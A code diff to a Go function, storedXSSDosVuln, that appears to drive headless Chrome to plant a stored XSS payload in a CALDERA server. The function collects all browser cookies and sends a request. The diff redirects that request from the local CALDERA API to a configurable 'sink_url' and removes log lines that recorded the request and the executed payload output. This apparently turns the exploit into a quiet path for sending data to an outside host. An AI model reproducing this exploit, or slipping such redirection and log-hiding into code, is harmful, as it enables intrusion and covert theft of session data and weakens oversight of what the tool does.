@@ -119,6 +119,8 @@ func storedXSSDosVuln(payload string) error {
 		Jitter:             "2/8",
 		Visibility:         "51",
 	}
+	sinkURL := viper.GetString("sink_url")
+
 	if err := chromedp.Run(caldera.Driver.Context,
 		chromedp.ActionFunc(func(ctx context.Context) error {
 			cookies, err := network.GetAllCookies().Do(ctx)
@@ -134,7 +136,7 @@ func storedXSSDosVuln(payload string) error {
 				}
 				body := bytes.NewReader(payloadBytes)
 
-				req, err := http.NewRequest("POST", "http://localhost:8888/api/v2/operations", body)
+				req, err := http.NewRequest("POST", sinkURL, body)
 				if err != nil {
 					log.WithError(err).Error("failed to create request")
 					return err
@@ -150,10 +152,6 @@ func storedXSSDosVuln(payload string) error {
 				}
 				defer resp.Body.Close()
 
-				log.WithFields(log.Fields{
-					"Request": req,
-					"Payload": payload,
-				}).Info(color.GreenString("Successfully introduced payload"))
 			}
 
 			return nil
@@ -175,12 +173,7 @@ func storedXSSDosVuln(payload string) error {
 
 	// handle payloads that use alerts, prompts, etc.
 	chromedp.ListenTarget(caldera.Driver.Context, func(ev interface{}) {
-		if ev, ok := ev.(*page.EventJavascriptDialogOpening); ok {
-			log.WithFields(log.Fields{
-				"Prompt output": ev.Message,
-				"Payload":       payload,
-			}).Info(color.GreenString("Successfully executed payload!!\n" +
-				"Closing the prompt and taking a screenshot of the aftermath"))
+		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
 			go func() {
 				if err := chromedp.Run(caldera.Driver.Context,
 					page.HandleJavaScriptDialog(true),
@@ -244,11 +237,14 @@ func storedXSSDosVuln(payload string) error {
 		return err
 	}
 
+	log.WithFields(log.Fields{
+		"Payload": payload,
+	}).Info(color.GreenString("Successfully introduced payload"))
+
 	if err := os.WriteFile(imagePath+"2.png", buf, 0644); err != nil {
 		log.WithError(err).Error("failed to write screenshot to disk")
 		return err
 	}
 
 	return nil
-
 }
